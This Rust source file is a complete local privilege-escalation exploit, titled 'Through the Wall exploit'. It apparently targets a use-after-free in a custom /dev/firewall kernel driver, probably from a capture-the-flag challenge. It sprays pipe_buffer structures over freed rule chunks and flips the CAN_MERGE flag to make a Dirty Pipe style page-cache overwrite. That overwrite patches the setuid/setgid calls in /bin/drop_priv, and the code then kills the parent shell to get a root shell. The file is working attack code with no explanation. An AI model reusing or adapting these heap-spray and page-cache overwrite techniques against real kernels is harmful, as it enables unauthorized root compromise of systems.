use std::ffi::{c_int, c_ulong, c_void};
use std::fs::OpenOptions;
use std::io;
use std::os::fd::AsRawFd;
use std::ptr;

const DROP_PRIV_PATH: &str = "/bin/drop_priv";
const DROP_PRIV_PATCH_OFFSETS: [u64; 3] = [
    0x17d3, // gid_t gid = 1000
    0x17e9, // setgid(1000)
    0x17f3, // setuid(1000)
];
const PIPE_BUF_FLAGS_OFF: u64 = 0x18;
const PIPE_BUF_STRUCT_SIZE: u64 = 0x28;
const PIPE_BUF_FLAG_CAN_MERGE: u32 = 0x10;
const PIPE_RING_SLOTS: usize = 16;
const F_GETFL: c_int = 3;
const F_SETFL: c_int = 4;
const O_NONBLOCK: c_int = 0x800;
const SIGKILL: c_int = 9;

unsafe extern "C" {
    fn ioctl(fd: c_int, request: c_ulong, ...) -> c_int;
    fn pipe(pipefd: *mut c_int) -> c_int;
    fn write(fd: c_int, buf: *const c_void, count: usize) -> isize;
    fn read(fd: c_int, buf: *mut c_void, count: usize) -> isize;
    fn fcntl(fd: c_int, cmd: c_int, ...) -> c_int;
    fn splice(
        fd_in: c_int,
        off_in: *mut i64,
        fd_out: c_int,
        off_out: *mut i64,
        len: usize,
        flags: u32,
    ) -> isize;
    fn getppid() -> c_int;
    fn kill(pid: c_int, sig: c_int) -> c_int;
}

#[repr(C)]
#[allow(nonstandard_style)]
enum IoctlCMD {
    FW_ADD_RULE = 0x41004601,
    FW_DEL_RULE = 0x40044602,
    FW_EDIT_RULE = 0x44184603,
    FW_SHOW_RULE = 0x84184604,
}

#[repr(C)]
struct FwReq {
    idx: i32,
    pad: u32,
    off: u64,
    size: u64,
    data: [u8; 0x400],
}

fn fw_add(fd: c_int) -> io::Result<i32> {
    let mut rule = [0; 0x100];
    let text = b"1.1.1.1 2.2.2.2 80 1 cafe";

    rule[..text.len()].copy_from_slice(text);

    let idx = unsafe { ioctl(fd, IoctlCMD::FW_ADD_RULE as c_ulong, rule.as_ptr()) };
    if idx < 0 {
        Err(io::Error::last_os_error())
    } else {
        Ok(idx)
    }
}

fn fw_del(fd: c_int, idx: i32) -> io::Result<()> {
    let ret = unsafe { ioctl(fd, IoctlCMD::FW_DEL_RULE as c_ulong, idx as c_ulong) };
    if ret < 0 {
        Err(io::Error::last_os_error())
    } else {
        Ok(())
    }
}

fn fw_show(fd: c_int, idx: i32, off: u64, out: &mut [u8]) -> io::Result<()> {
    if out.len() > 0x400 {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "FW_SHOW_RULE output buffer too large",
        ));
    }

    let mut req = FwReq {
        idx,
        pad: 0,
        off,
        size: out.len() as u64,
        data: [0; 0x400],
    };

    let ret = unsafe { ioctl(fd, IoctlCMD::FW_SHOW_RULE as c_ulong, &mut req) };
    if ret < 0 {
        Err(io::Error::last_os_error())
    } else {
        out.copy_from_slice(&req.data[..out.len()]);
        Ok(())
    }
}

fn fw_edit(fd: c_int, idx: i32, off: u64, data: &[u8]) -> io::Result<()> {
    if data.len() > 0x400 {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "FW_EDIT_RULE input buffer too large",
        ));
    }

    let mut req = FwReq {
        idx,
        pad: 0,
        off,
        size: data.len() as u64,
        data: [0; 0x400],
    };
    req.data[..data.len()].copy_from_slice(data);

    let ret = unsafe { ioctl(fd, IoctlCMD::FW_EDIT_RULE as c_ulong, &mut req) };
    if ret < 0 {
        Err(io::Error::last_os_error())
    } else {
        Ok(())
    }
}

fn pipe_create() -> io::Result<[c_int; 2]> {
    let mut fds = [-1; 2];
    let ret = unsafe { pipe(fds.as_mut_ptr()) };
    if ret < 0 {
        Err(io::Error::last_os_error())
    } else {
        Ok(fds)
    }
}

fn pipe_write(fd: c_int, buf: &[u8]) -> io::Result<()> {
    let mut written = 0;

    while written < buf.len() {
        let ret = unsafe {
            write(
                fd,
                buf[written..].as_ptr().cast::<c_void>(),
                buf.len() - written,
            )
        };
        if ret < 0 {
            let err = io::Error::last_os_error();
            if err.kind() == io::ErrorKind::Interrupted {
                continue;
            }
            return Err(err);
        }
        if ret == 0 {
            return Err(io::Error::new(io::ErrorKind::WriteZero, "short pipe write"));
        }
        written += ret as usize;
    }

    Ok(())
}

#[derive(Debug)]
struct PipeBufferLeak {
    page: u64,
    offset: u32,
    len: u32,
    ops: u64,
    flags: u32,
    private: u64,
}

fn read_u32(buf: &[u8], off: usize) -> u32 {
    u32::from_ne_bytes(buf[off..off + 4].try_into().unwrap())
}

fn read_u64(buf: &[u8], off: usize) -> u64 {
    u64::from_ne_bytes(buf[off..off + 8].try_into().unwrap())
}

fn pipe_buffer_leak(leak: &[u8]) -> PipeBufferLeak {
    PipeBufferLeak {
        page: read_u64(leak, 0x00),
        offset: read_u32(leak, 0x08),
        len: read_u32(leak, 0x0c),
        ops: read_u64(leak, 0x10),
        flags: read_u32(leak, 0x18),
        private: read_u64(leak, 0x20),
    }
}

fn looks_like_pipe_buffer(pb: &PipeBufferLeak, pipe_count: usize) -> bool {
    (pb.page & 0xffff_0000_0000_0000) == 0xffff_0000_0000_0000
        && (pb.ops & 0xffff_0000_0000_0000) == 0xffff_0000_0000_0000
        && pb.offset <= 0x1000
        && pb.len > 0
        && pb.len <= pipe_count as u32
}

fn pipe_drain(read_fd: c_int) -> io::Result<()> {
    let flags = unsafe { fcntl(read_fd, F_GETFL) };
    if flags < 0 {
        return Err(io::Error::last_os_error());
    }

    if unsafe { fcntl(read_fd, F_SETFL, flags | O_NONBLOCK) } < 0 {
        return Err(io::Error::last_os_error());
    }

    let mut buf = [0u8; 0x1000];
    loop {
        let ret = unsafe { read(read_fd, buf.as_mut_ptr().cast::<c_void>(), buf.len()) };
        if ret > 0 {
            continue;
        }
        if ret == 0 {
            break;
        }

        let err = io::Error::last_os_error();
        match err.kind() {
            io::ErrorKind::Interrupted => continue,
            io::ErrorKind::WouldBlock => break,
            _ => {
                let _ = unsafe { fcntl(read_fd, F_SETFL, flags) };
                return Err(err);
            }
        }
    }

    if unsafe { fcntl(read_fd, F_SETFL, flags) } < 0 {
        return Err(io::Error::last_os_error());
    }

    Ok(())
}

fn pipe_patch_slot_flags(fd: c_int, idx: i32, slot: usize, flags: u32) -> io::Result<()> {
    if slot >= PIPE_RING_SLOTS {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "pipe ring slot overflow",
        ));
    }

    let off = PIPE_BUF_FLAGS_OFF + slot as u64 * PIPE_BUF_STRUCT_SIZE;
    fw_edit(fd, idx, off, &flags.to_ne_bytes())
}

fn dirty_pipe_write(
    fwfd: c_int,
    rule_idx: i32,
    pipefd: [c_int; 2],
    slot: usize,
    filefd: c_int,
    target_off: u64,
    data: &[u8],
) -> io::Result<()> {
    if target_off == 0 {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "dirty pipe target offset must be > 0",
        ));
    }

    pipe_drain(pipefd[0])?;

    let mut splice_off = target_off as i64 - 1;
    let spliced = unsafe { splice(filefd, &mut splice_off, pipefd[1], ptr::null_mut(), 1, 0) };
    if spliced != 1 {
        return Err(if spliced < 0 {
            io::Error::last_os_error()
        } else {
            io::Error::new(io::ErrorKind::UnexpectedEof, "short splice into pipe")
        });
    }

    pipe_patch_slot_flags(fwfd, rule_idx, slot, PIPE_BUF_FLAG_CAN_MERGE)?;
    pipe_write(pipefd[1], data)?;
    pipe_drain(pipefd[0])
}

fn main() {
    println!("[Through the Wall exploit] by icctx.");
    let file = OpenOptions::new()
        .write(true)
        .read(true)
        .open("/dev/firewall")
        .expect("failed to open /dev/firewall");

    let fd = file.as_raw_fd();
    println!("[+] opened fd {fd}");

    // allocate fw_rule chunks and free them
    let mut idxs = Vec::new();
    for _ in 0..128 {
        let idx = fw_add(fd).expect("FW_ADD_RULE failed!");
        println!("[add]: {}", idx);
        idxs.push(idx);
    }

    for &idx in &idxs {
        fw_del(fd, idx).expect("FW_DEL_RULE failed!");
        println!("[del]: {}", idx);
    }

    let mut leak = [0; 0x400];
    fw_show(fd, idxs[0], 0, &mut leak).expect("FW_SHOW_RULE failed");
    println!("[leak idx[{}]]: {:02x?}", idxs[0], &leak[..32]);

    println!("[~] spraying pipe");
    // spray pipe_buffer arrays over freed kmalloc-1024 rule chunks
    let mut pipes = Vec::new();
    for i in 0..192 {
        let pipefd = pipe_create().expect("pipe failed!");
        // writing tag, in order to determine target pipefd
        let data = vec![b'A' + (i % 26) as u8; i + 1];
        pipe_write(pipefd[1], &data).expect("pipe write failed!");

        println!("[pipe {i}]: r={}, w={}", pipefd[0], pipefd[1]);
        pipes.push(pipefd);
    }

    let mut hit_idx = -1;
    let mut hit_pipe = -1;

    // scan dangling rule indexes until one points at a pipe_buffer array
    for &idx in &idxs {
        let mut leak = [0u8; 0x400];
        if fw_show(fd, idx, 0, &mut leak).is_err() {
            continue;
        }

        let pb = pipe_buffer_leak(&leak);
        println!(
            "[leak idx {}] page=0x{:016x} offset=0x{:x} len={} ops=0x{:016x} flags=0x{:x} private=0x{:016x}",
            idx, pb.page, pb.offset, pb.len, pb.ops, pb.flags, pb.private
        );

        if looks_like_pipe_buffer(&pb, pipes.len()) {
            hit_idx = idx;
            hit_pipe = (pb.len - 1) as i32;
            println!("[+] hit: rule idx {} overlaps pipe[{}]", hit_idx, hit_pipe);
            break;
        }
    }

    if hit_idx < 0 {
        panic!("failed to find pipe_buffer overlap");
    }

    println!("[+] selected hit_idx={} hit_pipe={}", hit_idx, hit_pipe);

    println!(
        "[+] drop_priv patch offsets: gid-list=0x{:x} setgid=0x{:x} setuid=0x{:x}",
        DROP_PRIV_PATCH_OFFSETS[0], DROP_PRIV_PATCH_OFFSETS[1], DROP_PRIV_PATCH_OFFSETS[2]
    );

    let drop_priv = OpenOptions::new()
        .read(true)
        .open(DROP_PRIV_PATH)
        .expect("failed to open /bin/drop_priv");
    let drop_priv_fd = drop_priv.as_raw_fd();
    let zero = 0u32.to_ne_bytes();
    let hit_pipefd = pipes[hit_pipe as usize];

    for (i, &patch_off) in DROP_PRIV_PATCH_OFFSETS.iter().enumerate() {
        let slot = i + 1;
        println!("[*] zeroing drop_priv immediate at 0x{patch_off:x} with pipe slot {slot}");
        dirty_pipe_write(
            fd,
            hit_idx,
            hit_pipefd,
            slot,
            drop_priv_fd,
            patch_off,
            &zero,
        )
        .expect("dirty_pipe_write failed");
    }

    println!("[+] patched /bin/drop_priv");
    println!("[*] killing parent shell so init respawns drop_priv");
    let parent = unsafe { getppid() };
    let ret = unsafe { kill(parent, SIGKILL) };
    if ret < 0 {
        eprintln!(
            "[-] kill({parent}, SIGKILL) failed: {}",
            io::Error::last_os_error()
        );
        eprintln!("[*] patch is still in page cache; exit the current shell manually");
    }
}
